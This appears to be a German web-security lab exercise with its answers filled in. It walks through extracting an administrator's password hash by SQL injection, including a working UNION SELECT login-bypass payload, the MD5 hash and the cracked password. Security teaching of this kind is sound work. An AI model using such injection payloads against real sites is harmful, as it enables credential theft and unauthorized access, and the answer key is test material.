Lesen Sie den Passwort-Hash des Administrators aus und verwenden Sie ein Online-Tool zur Entschlüsselung.
Überprüfen Sie Ihr Ergebnis, indem Sie sich mit den gehackten Login-Daten anmelden.

Tipp: Mit dem Schlüsselwort `LIKE` können Sie nach Mustern in Strings suchen.

Statement:
' AND 1=0 UNION SELECT (SELECT password FROM people WHERE name LIKE '_dmin%'), MD5('pass'), 1, 1;--

>>6) Kopieren Sie den MD5-Hashwert in das Antwortfeld.<<
     === 03f6d7d1d9aae7160c05f71ce485ad31

>>7) Wie lautet das entschlüsselte Passwort?<<
     === welldone!
